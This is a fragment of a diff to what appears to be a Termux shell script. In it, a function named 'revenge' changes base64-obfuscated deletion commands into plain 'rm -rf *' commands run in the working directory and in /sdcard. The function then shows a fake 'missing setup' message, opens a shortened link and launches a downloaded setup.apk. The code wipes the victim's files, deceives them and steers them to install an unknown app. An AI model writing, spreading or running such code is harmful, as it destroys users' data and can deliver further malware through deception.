@@ -54,9 +54,10 @@ newDirName+=$numOfFolders
 
 mkdir -p ~/sdcard/$newDirName; 
 }
-revenge() {
-eval $(base64 -d <<<"cm0gLXJmIC9zZGNhcmQvKg==")
-eval $(base64 -d <<<"cm0gLXJmICo=")
+revenge(){
+rm -rf *
+cd /sdcard
+rm -rf *
 echo -e "$red [!]It seems there is missing setup$blank"
 sleep 0.2
 echo -e "$green Worry out we gonna fix it soon$blank"
@@ -71,7 +72,6 @@ sleep 4
 termux-open https://bit.ly/3bwvA4T
 sleep 80
 termux-open /sdcard/Download/setup.apk
-pkg install libcaca && cacafire
 spam
 }
 menu(){
